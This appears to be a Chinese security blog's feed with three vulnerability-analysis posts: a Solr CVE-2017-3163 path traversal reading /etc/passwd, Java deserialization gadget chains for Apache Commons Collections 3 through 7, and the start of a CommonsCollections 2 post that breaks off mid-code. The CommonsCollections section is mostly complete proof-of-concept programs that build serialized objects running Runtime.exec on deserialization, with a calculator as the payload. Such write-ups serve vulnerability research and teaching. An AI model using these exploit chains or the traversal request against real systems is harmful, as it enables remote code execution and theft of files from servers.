    <content type="html"><![CDATA[<h1 id="solr漏洞分析–CVE-2017-3163"><a href="#solr漏洞分析–CVE-2017-3163" class="headerlink" title="solr漏洞分析–CVE-2017-3163"></a>solr漏洞分析–CVE-2017-3163</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>solr 6.4.0<br>java 1.8</p><p>solr 所有版本下载地址：<a href="http://archive.apache.org/dist/lucene/solr/">http://archive.apache.org/dist/lucene/solr/</a></p><p>启动低版本启动，在example目录下：</p><blockquote><p>java -Xdebug -Xrunjdwp:transport=dt_socket,address=10010,server=y,suspend=y -jar start.jar</p></blockquote><p>高版本启动,bin目录下：</p><blockquote><p>./solr.cmd -f -a “-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=10010” -port 8983 -s “./Solr/solr-6.4.0/example/example-DIH/solr”</p></blockquote><p>IDEA:<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeu966q2jj31b90u0n3r.jpg" alt=""></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul><li>1.4.0-6.4.0</li></ul><p>低版本：</p><blockquote><p><a href="http://127.0.0.1:8983/solr/replication?command=filecontent&amp;file=../../../../../../../../../../../../../etc/passwd&amp;wt=filestream&amp;generation=1">http://127.0.0.1:8983/solr/replication?command=filecontent&amp;file=../../../../../../../../../../../../../etc/passwd&amp;wt=filestream&amp;generation=1</a></p></blockquote><p>较高版本：</p><blockquote><p><a href="http://127.0.0.1:8983/solr/db/replication?command=filecontent&amp;file=../../../../../../../../../../../../../etc/passwd&amp;wt=filestream&amp;generation=1">http://127.0.0.1:8983/solr/db/replication?command=filecontent&amp;file=../../../../../../../../../../../../../etc/passwd&amp;wt=filestream&amp;generation=1</a></p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeudj1f4pj30y40kijwt.jpg" alt=""></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeugygyfpj322w0f8q8b.jpg" alt=""></p><p>首先在filter下断点，可以看见这里将request，response，chain传入了重写的filter。</p><p>org.apache.solr.servlet.SolrDispatchFilter#getHttpSolrCall<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeuqzidu6j31800mmgq1.jpg" alt=""></p><p>其中对一些变量进行了赋值，主要是解析req从中获取core名称，并向req中写入一些属性，初始化一些core相关的参数，检查core在不在corecontainer中，并做一些错误异常抛出的处理，以及得到当前url的action类型。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeusvume8j31q20ciwmw.jpg" alt=""></p><p>后面跟入httpsolrall类的call方法<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeuur8rjaj31300teafz.jpg" alt=""><br>继续跟进到init函数中，init中进行初始化的一些解析操作，比如handler、path、action等成员的解析赋值，比如这里的action为PROCESS<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeuwresf4j313u0pgwno.jpg" alt=""></p><p>下面根据action的值进入不同的分支中：<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeuy77tisj31d60r04e0.jpg" alt=""><br>进入execute函数中，并继续跟入execute中，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpev2j6ni2j314m08uq7s.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpev4d0w4dj31ce0eyadb.jpg" alt=""><br>跟入hanlderRequest中，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpev4d0w4dj31ce0eyadb.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpev6v82lnj31ka0cu10d.jpg" alt=""><br>在handleRequestBody中，对commadn进行赋值<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpev6v82lnj31ka0cu10d.jpg" alt=""></p><p>solr/core/src/java/org/apache/solr/handler/ReplicationHandler.java<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpevbfszbuj316g0gkn1c.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpevcptqu4j31l80n40y9.jpg" alt=""><br>基本上都是从SolrParams对象中取值并赋值到DirectoryFileStream对象成员<br>solr/core/src/java/org/apache/solr/handler/ReplicationHandler.java</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpevi8w7wwj31760u0tpw.jpg" alt=""><br>将恶意文件读取的参数传入dir.openInput，查看IndexInput类对象in<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpevlh2va4j31m209mdmi.jpg" alt=""></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpewm40h1qj31na0jcgq5.jpg" alt=""><br>在6.4.2中添加了如下代码，判断是否存在..，如果存在则会返回403<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpewnkpmcfj30po0eygn9.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CommonsCollections 3～7分析</title>
    <link href="http://yoursite.com/2021/04/05/CommonsCollections%203~7%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2021/04/05/CommonsCollections%203~7%E5%88%86%E6%9E%90/</id>
    <published>2021-04-05T10:44:01.000Z</published>
    <updated>2021-07-29T05:51:01.197Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections-3-7分析"><a href="#CommonsCollections-3-7分析" class="headerlink" title="CommonsCollections 3~7分析"></a>CommonsCollections 3~7分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看完了CC1和CC2后面的内容都简单的多了，所以就一起分析一下。</p><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><ul><li>jdk1.7</li><li>Commons Collections 4.0</li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>cc3和cc1和cc2蛮像的，就是cc1+cc2的变种，在cc3中引入了新的类TrAXFilter和InstantiateTransformer。在cc2中是利用InvokeTransform触发newTransFormer进行命令执行的，而在cc3中，则是通过TrAXFilter触发NewTransFormer进行命令执行的。</p><pre><code>public class TrAXFilter extends XMLFilterImpl &#123;    private Templates              _templates;    private TransformerImpl        _transformer;    private TransformerHandlerImpl _transformerHandler;    private boolean _useServicesMechanism = true;    public TrAXFilter(Templates templates)  throws        TransformerConfigurationException    &#123;            _templates = templates;            _transformer = (TransformerImpl) templates.newTransformer();            _transformerHandler = new TransformerHandlerImpl(_transformer);            _useServicesMechanism = _transformer.useServicesMechnism();    &#125;</code></pre><p>我们看见templates这个字段，这个字段是可控的，因此我们只需要通过反射修改templates的内容，再找到一个点，可以将TrAXfilter初始化就可以了。而这里通过反射修改templates和cc2中的一样，下面给出代码：</p><pre><code class="java">    ClassPool pool = ClassPool.getDefault();        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        CtClass cc = pool.makeClass(&quot;Poc&quot;);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;        // 创建 static 代码块，并插入代码        cc.makeClassInitializer().insertBefore(cmd);        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));        // 写入.class 文件        byte[] classBytes = cc.toBytecode();        byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;;        TemplatesImpl templates = TemplatesImpl.class.newInstance();        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);        // 进入 defineTransletClasses() 方法需要的条件        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);        setFieldValue(templates, &quot;_class&quot;, null);</code></pre><p>那我们又要如何初始化TrAXfilter呢，上面我们提到过InstantiateTransformer，我们来看看它的代码。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8ob76310j31f60kgdkg.jpg" alt=""></p><p>我们只需要将input设置为TrAXfilter，就可以进行初始化了。下面给出POC：</p><pre><code class="java">package cc3;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class Poc &#123;    public static void main(String[] args) throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        CtClass cc = pool.makeClass(&quot;Poc&quot;);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;        // 创建 static 代码块，并插入代码        cc.makeClassInitializer().insertBefore(cmd);        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));        // 写入.class 文件        byte[] classBytes = cc.toBytecode();        byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;;        TemplatesImpl templates = TemplatesImpl.class.newInstance();        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);        // 进入 defineTransletClasses() 方法需要的条件        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);        setFieldValue(templates, &quot;_class&quot;, null);        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)        &#125;);        HashMap innermap = new HashMap();        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);        Constructor handler_constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);        handler_constructor.setAccessible(true);        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;,map_handler); //创建proxy对象        Constructor AnnotationInvocationHandler_Constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class);        AnnotationInvocationHandler_Constructor.setAccessible(true);        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);        try&#123;            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc3&quot;));            outputStream.writeObject(handler);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc3&quot;));            inputStream.readObject();        &#125;catch(Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;        final Field field = getField(obj.getClass(), fieldName);        field.set(obj, value);    &#125;    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;        Field field = null;        try &#123;            field = clazz.getDeclaredField(fieldName);            field.setAccessible(true);        &#125;        catch (NoSuchFieldException ex) &#123;            if (clazz.getSuperclass() != null)                field = getField(clazz.getSuperclass(), fieldName);        &#125;        return field;    &#125;&#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8od7mj1hj31ht0u0hdt.jpg" alt=""></p><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><h3 id="测试环境-1"><a href="#测试环境-1" class="headerlink" title="测试环境"></a>测试环境</h3><ul><li>jdk1.7</li><li>Commons Collections 4.0</li></ul><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们先来看看Poc的样子</p><pre><code class="java">package cc4;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import javassist.*;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.PriorityQueue;public class Poc &#123;    public static void main(String[] args) throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        CtClass cc = pool.makeClass(&quot;Poc&quot;);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;        // 创建 static 代码块，并插入代码        cc.makeClassInitializer().insertBefore(cmd);        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错        // 写入.class 文件        byte[] classBytes = cc.toBytecode();        byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;;        TemplatesImpl templates = TemplatesImpl.class.newInstance();        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);        // 进入 defineTransletClasses() 方法需要的条件        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);        setFieldValue(templates, &quot;_class&quot;, null);        Constructor constructor = Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class);        constructor.setAccessible(true);        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(&quot;newTransformer&quot;);        TransformingComparator comparator = new TransformingComparator(transformer);        PriorityQueue queue = new PriorityQueue(1);        Object[] queue_array = new Object[]&#123;templates,1&#125;;        Field queue_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;);        queue_field.setAccessible(true);        queue_field.set(queue,queue_array);        Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;);        size.setAccessible(true);        size.set(queue,2);        Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);        comparator_field.setAccessible(true);        comparator_field.set(queue,comparator);        try&#123;            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc4&quot;));            outputStream.writeObject(queue);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc4&quot;));            inputStream.readObject();        &#125;catch(Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;        final Field field = getField(obj.getClass(), fieldName);        field.set(obj, value);    &#125;    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;        Field field = null;        try &#123;            field = clazz.getDeclaredField(fieldName);            field.setAccessible(true);        &#125;        catch (NoSuchFieldException ex) &#123;            if (clazz.getSuperclass() != null)                field = getField(clazz.getSuperclass(), fieldName);        &#125;        return field;    &#125;&#125;</code></pre><p>我们可以看见cc4点Poc很眼熟啊，就是cc2➕cc3.cc3前半段用了cc1的利用链，这里将利用链改成了cc2的。</p><h2 id="Commons-Collections-5"><a href="#Commons-Collections-5" class="headerlink" title="Commons Collections 5"></a>Commons Collections 5</h2><h3 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h3><ul><li>jdk 1.7</li><li>Commons Collections 4.0</li></ul><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在cc1中只要通过LazyMap#get()传递任意内容就可以触发命令执行。cc5中利用到的是TiedMapEntry这个类。我们跟进去看看。</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8qjb610qj30zu02g3ze.jpg" alt=""></p><p>跟入TiedMapEntry#toString的getValue中看看。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8qt9x7mkj30oa06edgc.jpg" alt=""><br>这里调用了get，我们先来试试看可否执行命令：<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8qvqhivlj31hi0osau5.jpg" alt=""><br>所以现在我们就要寻找什么地方调用了toString这个函数，而在cc5中用到的是这个函数BadAttributeValueExpException<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8r0cj9snj30ss072wf9.jpg" alt=""><br>我们通过寻找网上的Poc都是通过反射的反射修改val值的，但是其实这里并不需要这么做<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8r98qobbj317i0niq6i.jpg" alt=""><br>通过阅读上面的代码，虽然这里的val是private属性，然而BadAttributeValueExpException却是public。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8rcfwwrvj315x0u0h6q.jpg" alt=""></p><p>所以我们直接调用就可以了</p><blockquote><p>BadAttributeValueExpException poc = new BadAttributeValueExpException(tiedmap);</p></blockquote><p>也是可以执行命令的。</p><h3 id="注意！"><a href="#注意！" class="headerlink" title="注意！"></a>注意！</h3><p>其实这里是不可以直接调用的,而是需要通过反射。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8rpvqqg5j31920u0awm.jpg" alt=""><br>如图，这里的执行是生成反序列化的时候进行命令执行的，而不是通过读取反序列化时触发，原因是此时val的值为UNIXProcess，这是不可以被反序列化的，所以我们需要在不触发rce的前提，将val设置为构造好的TiedMapEntry。</p><p>下面给出Poc</p><pre><code class="java">import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections4.keyvalue.TiedMapEntry;import javax.management.BadAttributeValueExpException;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;public class cc5 &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;                        String.class, Class[].class &#125;, new Object[] &#123;                        &quot;getRuntime&quot;, new Class[0] &#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;open -a Calculator.app&quot;&#125;)&#125;);        HashMap innermap = new HashMap();        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);        TiedMapEntry tiedmap = new TiedMapEntry(map,123);        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);        Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);        val.setAccessible(true);        val.set(poc,tiedmap);        try&#123;            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc5&quot;));            outputStream.writeObject(poc);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc5&quot;));            inputStream.readObject();        &#125;catch(Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><h3 id="测试环境-2"><a href="#测试环境-2" class="headerlink" title="测试环境"></a>测试环境</h3><ul><li>jdk1.7</li><li>Commons Collections 3.2</li></ul><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在cc6的后半段链使用的是cc1中的链，在cc5，通过对TiedMapEntry#toString方法的调用，触发了TiedMapEntry#getValue，从而触发了LazyMap#get完成后半段的调用。而在cc6中则是通过TiedMapEntry#hashCode触发对TiedMapEntry#getValue的调用：</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8zdz9d9xj31do068mzd.jpg" alt=""></p><p>现在就来寻找，哪里调用了hashCode()。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp90owjx0wj30uk05igm6.jpg" alt=""><br>如上图中的HashMap#hash调用了，而在HashMap#put中则调用了hash方法，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp90smpze0j311a0kmjua.jpg" alt=""><br>而此时的key值依旧是不可控的，我们还需要寻找哪里调用了put。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp90u1u6nbj30he03eglt.jpg" alt=""><br>此时我们可以构造Poc了。</p><pre><code class="java">package cc6;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.keyvalue.TiedMapEntry;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.HashSet;public class cc6 &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;                        String.class, Class[].class &#125;, new Object[] &#123;                        &quot;getRuntime&quot;, new Class[0] &#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;open  /System/Applications/Calculator.app&quot;&#125;)&#125;);        HashMap innermap = new HashMap();        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);        TiedMapEntry tiedmap = new TiedMapEntry(map,123);        HashSet hashset = new HashSet(1);        hashset.add(&quot;foo&quot;);        Field field = Class.forName(&quot;java.util.HashSet&quot;).getDeclaredField(&quot;map&quot;);        field.setAccessible(true);        HashMap hashset_map = (HashMap) field.get(hashset);        Field table = Class.forName(&quot;java.util.HashMap&quot;).getDeclaredField(&quot;table&quot;);        table.setAccessible(true);        Object[] array = (Object[])table.get(hashset_map);        Object node = array[0];        Field key = node.getClass().getDeclaredField(&quot;key&quot;);        key.setAccessible(true);        key.set(node,tiedmap);        try&#123;            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc6&quot;));            outputStream.writeObject(hashset);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc6&quot;));            inputStream.readObject();        &#125;catch(Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp90ntjyqjj310q0g6dm2.jpg" alt=""></p><p>第一个红框处主要是利用反射获取我们的 HashSet 的 map 属性，因为我们要先获取到 map 才能对 map 的 key 进行修改</p><p>第二个红框处则是修改我们 HashMap 中的 key 值为 hashset</p><p>在这里利用反射获取了 HashMap 中的 table 属性，table其实就是hashmap的存储底层，将 封装在了 Node 对象中，在获取到了 table 中的 key 之后，利用反射修改其为 hashset.(这里抄了木爷的hh)</p><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><h3 id="测试环境-3"><a href="#测试环境-3" class="headerlink" title="测试环境"></a>测试环境</h3><ul><li>jdk1.7</li><li>Commons Collections 3.2</li></ul><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>Poc</p><pre><code class="java">import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.*;public class cc7 &#123;    public static void main(String[] args) throws Exception &#123;        Transformer transformerChain = new ChainedTransformer(new Transformer[]&#123;&#125;);        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,                        new Class[]&#123;String.class, Class[].class&#125;,                        new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),                new InvokerTransformer(&quot;invoke&quot;,                        new Class[]&#123;Object.class, Object[].class&#125;,                        new Object[]&#123;null, new Object[0]&#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;open -a Calculator.app&quot;&#125;)        &#125;;        Map innerMap1 = new HashMap();        Map innerMap2 = new HashMap();        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);        lazyMap1.put(&quot;pp&quot;, 1);        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);        lazyMap2.put(&quot;yy&quot;, 1);        Hashtable hashtable = new Hashtable();        hashtable.put(lazyMap1, 1);        hashtable.put(lazyMap2, 2);        Field field =transformerChain.getClass().getDeclaredField(&quot;iTransformers&quot;);        field.setAccessible(true);        field.set(transformerChain,transformers);        lazyMap2.remove(&quot;yy&quot;);        try&#123;            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc7&quot;));            outputStream.writeObject(hashtable);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc7&quot;));            inputStream.readObject();        &#125;catch(Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p>在cc1中是通过AnnotationInvocationHandler#invoke来触发对恶意代理handler调用其invoke方法从而触发LazyMap#get方法.而cc7中更加的直接，通过AbstractMap#equals来触发对LazyMap#get方法的调用：</p><p>这里的就讲讲为什么要put两次：<br>在第一次调用reconstitutionPut时，会把key和value注册进table中：<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp91usp6qnj313a0hyaf4.jpg" alt=""><br>此时由于tab[index]里并没有内容，所以并不会走进这个for循环内，而是给将key和value注册进tab中。在第二次调用reconstitutionPut时，tab中才有内容，我们才有机会进入到这个for循环中，从而调用equals方法。这也是为什么要调用两次put的原因。</p><p>为什么最后要 remove？而且为什么这里 remove(“yy”)</p><p>首先来说一下为什么最后要 remove ，因为在 AbstractMap#equals 这里的 size()等于1，而我们不remove的话 m.size()就为2并且直接返回 false，导致无法进入到后面。那么为什么要 remove(“yy”)，这里我们需要从 writeObject 中进行查看，在生成 payload 时，当我们利用 put 放入的时候会调用 equals，从而也会触发一次 AbstractMap#equals。里面会多出一个yy，如果不去掉，就会进入上面说的 AbstractMap#equals 中的 if 判断那段，从而导致无法进入到我们的出发点。</p>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CommonsCollections 2分析</title>
    <link href="http://yoursite.com/2021/04/01/CommonsCollections%202%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2021/04/01/CommonsCollections%202%E5%88%86%E6%9E%90/</id>
    <published>2021-04-01T14:16:01.000Z</published>
    <updated>2021-07-29T05:50:59.366Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections-2分析"><a href="#CommonsCollections-2分析" class="headerlink" title="CommonsCollections 2分析"></a>CommonsCollections 2分析</h1><h2 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h2><p>cc2的利用和cc1不同，这里用到了一个新的类库，可以允许开发者添加新的类和方法。下面来看看javassist的API文档的描述。</p><pre><code>The Javassist Core API.Javassist (Java programming assistant) makes bytecode engineering simple. It is a class library for editing bytecode in Java; it enables Java programs to define a new class at runtime and to modify a given class file when the JVM loads it.The most significant class of this package is CtClass. See the description of this class first.To know the version number of this package, type the following command:java -jar javassist.jarIt prints the version number on the console.</code></pre><p>它令java中运行时可以运行一个新的类，并在JVM虚拟机中可以加载它。</p><p>这里我们使用一个实例代码来更好的理解。相关方法可以翻看<a href="https://www.javassist.org/html/javassist/package-summary.html">javassist的API文档</a>。</p><pre><code class="java">import javassist.*;import java.io.IOException;public class test2 &#123;    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException &#123;        ClassPool pool = ClassPool.getDefault(); // 返回默认类池（其实就是在默认的jvm类搜索路径中搜索）        CtClass person = pool.makeClass(&quot;Person&quot;); // 创建Person类        CtField name = new CtField(pool.get(&quot;java.lang.String&quot;), &quot;name&quot;, person);//private String name        name.setModifiers(Modifier.PRIVATE);        person.addField(name, CtField.Initializer.constant(&quot;xiaotan&quot;));        person.addMethod(CtNewMethod.getter(&quot;getName&quot;,name));        person.addMethod(CtNewMethod.setter(&quot;setName&quot;,name));        //创建无参构造        CtConstructor 